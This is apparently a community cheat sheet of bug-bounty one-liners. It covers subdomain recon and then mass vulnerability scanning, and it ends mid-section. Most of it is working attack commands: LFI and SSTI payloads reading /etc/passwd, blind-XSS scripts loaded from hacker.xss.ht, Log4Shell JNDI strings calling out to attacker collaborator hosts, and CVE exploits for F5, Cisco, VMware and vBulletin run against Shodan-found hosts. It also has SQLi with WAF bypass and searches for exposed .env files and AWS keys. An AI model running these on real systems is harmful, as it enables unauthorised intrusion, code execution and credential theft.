cat domains.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a words.txt

###Extracts Juicy Informations

@Prial Islam Khan

for sub in $(cat domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a file.txt  ;done

###Find Subdomains TakeOver

@hahwul

subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ;

### Get multiple target’s Custom URLs from ParamSpider

@hahwul

cat domains | xargs -I % python3 ~/tool/ParamSpider/paramspider.py -l high -o ./spidering/paramspider/% -d % ;

### URLs Probing with cURL + Parallel

@akita_zen

cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk

### Dump In-scope Assets from chaos-bugbounty-list

@dwisiswant0

curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'

### Dump In-scope Assets from bounty-targets-data

@dwisiswant0
### HackerOne Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'

### BugCrowd Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

### Intigriti Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'

### YesWeHack Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

### HackenProof Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'

### Federacy Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

### Get all the urls out of a sitemap.xml

@healthyoutlet

curl -s domain.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'

### Pure bash Linkfinder

@ntrzz

curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > jslinks.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < jslinks.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf jslinks.txt

### Extract Endpoints from swagger.json

@zer0pwn

curl -s https://domain.tld/v2/swagger.json | jq '.paths | keys[]'

###CORS Misconfiguration

@manas_hunter

site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done

###Find Hidden Servers and/or Admin Panels

@rez0__

ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt

###Recon using api.recon.dev

@z0idsec

curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=site.com | jg .[].domain

###Find live host/domain/assets

@YashGoti

subfinder -d http://tesla.com -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u

###XSS without gf

@HacktifyS

waybackurls testphp.vulnweb.com| grep '=' |qsreplace '<ScRiPt>alert(document.domain)</ScRiPt>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<ScRiPt>alert(document.domain)</ScRiPt>" && echo "$host \033[0;31m" Vulnerable;done

###Extract endpoints from APK files

@laughface809

apkurlgrep -a path/to/file.apk

###Get Subdomains from IPs

@laughface809

python3 hosthunter.py <target-ips.txt> > vhosts.txt

###webscreenshot

@laughface809

python webscreenshot.py -i list.txt -w 40

###Removes duplicate URLs and parameter combinations

@laughface809

cat urls.txt |qsreplace -a

###Gather domains from content-security-policy:

@geeknik

curl -v -silent https://$domain --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u











# Subdomain Enumeration
**Juicy Subdomains**
```
subfinder -d target.com -silent | dnsprobe -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'
```
**from BufferOver.run**
```
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u 
```
**from Riddler.io**
```
curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```
**from nmap**
```
nmap --script hostmap-crtsh.nse target.com
```
**from CertSpotter**
```
curl -s "https://certspotter.com/api/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
**from Archive**
```
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```
**from JLDC**
```
curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
**from crt.sh**
```
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```
**from ThreatMiner**
```
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' |grep -o "\w.*target.com" | sort -u
```
**from Anubis**
```
curl -s "https://jldc.me/anubis/subdomains/target.com" | jq -r '.' | grep -o "\w.*target.com"
```
**from ThreatCrowd**
```
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq -r '.subdomains' | grep -o "\w.*target.com"
```
**from HackerTarget**
```
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"
```
--------
## Subdomain Takeover:
```
cat subs.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
```
```
subjack -w subs -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```
-------------------------------
## LFI:
```
cat hosts | gau |  gf lfi |  httpx  -path ~/Desktop/WEB/wordlist/lfi.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
```
```
waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
```
cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n";done
```
```
gau http://target.com | gf lfi | qsreplace "/etc/passwd" | httpx -t 250 -mr "root:x" 
```

```
findomain -t example.com | httpx -silent | waybackurls | grep "=" | qsreplace "/etc/passwd" | stringparse "root:x:0" | egrep -v Nothing
```

```
cat test | assetfinder -subs-only | httpx -nc -silent -p 80,443,8080,8443,8088,9000,9001,9002,9003 -path ~/Desktop/WEB/wordlist/lfi.txt -mr "root:x"
```

----------------------
## Open Redirect:
```
waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```
```
export LHOST="URL"; waybackurls $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```
```
cat subs.txt| waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```
-----------------------
## SSRF:
```
cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
```
```
cat file.txt | while read host do;do curl --path-as-is --insecure "$host/?unix:(7701 A's here) | "https://bugbounty.requestcatcher.com/ssrf" | grep "request caught" && echo "$host \033[0;31mVuln\n" || echo "$host \033[0;32mNot\n";done
```
```
cat wayback.txt | grep "=" | qsreplace "burpcollaborator_link" >> ssrf.txt; ffuf -c -w ssrf.txt -u FUZZ
```
----------------
## XSS:
```
cat domains.txt | waybackurls | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
```
```
gau target.com grep '='| qsreplace hack\" -a | while read url;do target-$(curl -s -l $url | egrep -o '(hack" | hack\\")'); echo -e "Target : \e[1;33m $url\e[om" "$target" "\n -"; done I sed 's/hack"/[xss Possible] Reflection Found/g'
```
```
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(" 
```
```
cat targets.txt | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
```
waybackurls target.com | grep '=' |qsreplace '<ScRiPt>alert(document.domain)</ScRiPt>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<ScRiPt>alert(document.domain)</ScRiPt>" && echo "$host \033[0;31m" Vulnerable;done
```
```
cat urls.txt | grep "=" | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
```
```
echo target.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq (freq or Airixss)
```
```
cat targets.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
```
```
waybackurls target.com | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b hacker.xss.ht pipe > output.txt
```
```
cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
```
---------------------
## Hidden Dirs:
```
dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt
```
```
for URL in $(<targets.txt); do ( ffuf -u "${URL}/FUZZ" -w wordlists.txt -ac ); done
```
```
ffuf -c -u target.com -H "Host: FUZZ" -w wordlist.txt 
```
**Search for Sensitive files from Wayback**
```
waybackurls domain.com| grep - -color -E "1.xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt"
```
```
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200
```
-------------------
## SQLi:
```
cat subs.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 5 --risk 3
```
----------------
## CORS:
```
gau "http://target.com" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
---------------
## Prototype Pollution:
```
subfinder -d target.com -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
-------------
## CVEs:
### CVE-2020-5902:
```
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```
### CVE-2020-3452:
```
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```
### CVE-2021-44228:
```
cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done
```
```
cat urls.txt | sed `s/https:///` | xargs -I {} echo `{}/${jndi:ldap://{}attacker.burpcollab.net}` >> lo4j.txt
```
### CVE-2022-0378:
```
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```
### CVE-2022-22954:
```
cat urls.txt | while read h do ; do curl -sk --path-as-is “$h/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/hosts")}”| grep "context" && echo "$h\033[0;31mV\n"|| echo "$h \033[0;32mN\n";done
```
---------
## RCE:
```
cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent 
```
### vBulletin 5.6.2
```
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```
```
subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt; ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```
-----------
## JS Files:
### Find JS Files:
```
gau -subs target.com |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
```
```
assetfinder target.com | waybackurls | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```
### Hidden Params in JS:
```
cat subdomains.txt | gauplus -subs -t 100 -random-agent | sort -u --version-sort | httpx -silent -threads 2000 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```
### Extract sensitive end-point in JS:
```
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
-------------------------
### SSTI:
```
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
```
---------------------------
## HeartBleed
```
cat urls.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line; safe; done
```
------------------
## Scan IPs
```
cat my_ips.txt | xargs -L100 shodan scan submit --wait 0
```
## Portscan
```
naabu -1 target.txt -rate 3000 -retries 1 -warm-up-time 0 -c 50 -ports 1-65535 -silent -o out.txt
```
## Screenshots using Nuclei
```
nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
```
## IPs from CIDR
```
echo cidr | httpx -t 100 | nuclei -t ~/nuclei-templates/ssl/ssl-dns-names.yaml | cut -d " " -f7 | cut -d "]" -f1 |  sed 's/[//' | sed 's/,/\n/g' | sort -u 
```
## SQLmap Tamper Scripts - WAF bypass
```
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
 --no-cast --no-escape --dbs --random-agent
```






### Auto scanner

```bash
subfinder -d site.com -all | naabu | httpx | nuclei -t nuclei-templates
```

### Finding files (For example in here .json file)

```bash
subfinder -d site.com -all | naabu | httpx | waybackurls | grep -E ".json(?:onp?)?$"
```

### Find interesting subdomain (For example like admin.staging.example.com) 

```bash
subfinder -d site.com -all | dnsprobe -silent | cut -d ' ' -f1 | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|vpn\|cdn\|coll\|sandbox\|qa\|intra\|extra\|s3\|external\|back'
```

### Find SQL injection at scale

```bash
subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
```

### Find open redirects at scale

```bash
subfinder -d site.com -all -silent | waybackurls | sort -u | gf redirect | qsreplace 'https://example.com' | httpx -fr -title --match-string 'Example Domain'
```

### Find SSTI at scale

```bash
echo "domain" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
```

### Scanning top exploited vulnerabilities according to CISA

```bash
subfinder -d site.com -all -silent | httpx -silent | nuclei -rl 50 -c 15 -timeout 10 -tags cisa -vv
```

### Bruteforce subdomains

```bash
subfinder -d site.com -all -silent | httpx -silent | hakrawler | tr "[:punct:]" "\n" | sort -u > wordlist.txt

puredns bruteforce wordlist.txt site.com -r resolvers.txt -w output.txt
```

### Finding Cross-Site Scripting (XSS) using KnoXSS API

```bash
echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh
```

### Clean list of host, port, and version

```bash
mkdir nmap; cat targets.txt | parallel -j 35 nmap {} -sTVC -host-timeout 15m -oN nmap/{} -p 22,80,443,8080 --open > /dev/null 2>&1; cd nmap; grep -Hari "/tcp" | tee -a ../services.txt; cd ../
```

### Waybackurls validator

```bash
waybackurls http://example.com | grep "url" | xargs -n 1 curl -s -o /dev/null -w "%{http_code} > %{url_effective}\n" | sort
```

### Extract endpoints from JS (Part 1)

```bash
curl -L -k -s https://www.example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -F '//' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\"" | awk -F "['\"]" '{print $2}' | sort -fu
```

### Extract endpoints from JS (Part 2)

```bash
curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\"; basename \"%\" | xargs -I \"#\" sh -c 'linkfinder.py -o cli -i #'"
```

### Extract endpoints from JS (Part 3)

```bash
curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
```

### Extract endpoints from JS (Part 4)

```bash
curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"'##### %\";curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
```

### Find Access Keys for IAM

```bash
echo example.com | subfinder -silent -all | httpx -silent -path ".env",".mysql_history","echo $(echo $(</dev/stdin) | cut -d "." -f2).sql" -mc 200 -ports 80,443,8080,8443 | grep -E -i "AKIA[A-Z0-9]{16}"
```

### Subdomain enumeration with Spyse API

```bash
curl -XGET "https://api.sypse.com/v3/data/domain/subdomain?limit=100&offset=100&domain=example.com" -H "Accept: application/json" -H "Authorization: Bearer TOKEN_HERE" 2>/dev/null | jq '.data.items | .[] | .name' | sed -e 's/^"//' -e 's/"$//' | grep example.com
```










## Find Subdomain
> projectdiscovery
```bash
subfinder -d target.com -silent | httpx -silent -o urls.txt
```
## Search Subdomain using Gospider
> https://github.com/KingOfBugbounty/KingOfBugBountyTips/
```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

## find .git/HEAD
> @ofjaaah
```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

## Check .git/HEAD
> @ofjaaah
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

## Find XSS
> cihanmehmet
### Single target
```bash
gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
```
### Multiple target
```bash
gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
```
## Find XSS
> dwisiswant0
```bash
#/bin/bash

hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht

# save to .sh, and run bash program.sh target.com
```
## Kxss to search param XSS
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
```bash
echo http://testphp.vulnweb.com/ | waybackurls | kxss
```

## XSS hunting multiple
> @ofjaaah
```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

## BXSS - Bling XSS in Parameters
> [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
```bash
subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
```

## Blind XSS In X-Forwarded-For Header
> [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
```bash
subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
```

## Gxss with single target
> @KathanP19
```bash
echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```

## XSS using gf with single target
> @infosecMatter
```bash
echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew 
```

## XSS without gf
> HacktifyS
```bash
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '<ScRiPt>alert(document.domain)</ScRiPt>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<ScRiPt>alert(document.domain)</ScRiPt>" && echo "$host \033[0;31m" Vulnerable;done
```
`or`
```bash
gospider -S target.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | grep '=' |qsreplace '<ScRiPt>alert(document.domain)</ScRiPt>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<ScRiPt>alert(document.domain)</ScRiPt>" && echo "$host \033[0;31m" Vulnerable;done
```

## XSS qsreplace
> @KingOfBugBounty
```bash
gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

## XSS httpx
> @ofjaah
```bash
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
```
## Automating XSS using Dalfox, GF and Waybackurls
> [Automating XSS using Dalfox, GF and Waybackurls](https://medium.com/bugbountywriteup/automating-xss-using-dalfox-gf-and-waybackurls-bc6de16a5c75)
```bash
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
```

## XSS from javascript hidden params
> @0xJin
```bash
assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```

## XSS freq
> @ofjaaah
```bash
echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```

## Find xss
> @skothastad
```bash
cat targets | waybackurls | anew | grep "=" | gf xss | nilo | Gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
```

> @mamunwhh
```bash
cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
```

> @SaraBadran18
```bash
cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro | dalfox pipe -b your.xss.ht -o xss.txt
```

## Find XSS + knoxss
> @ofjaaah
```bash
echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh 
```

## Dump In-Scope Assests from Bounty Program
### BugCrowd Programs
> @dwisiswant0
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

## Recon.dev
> @ofjaaah
```bash
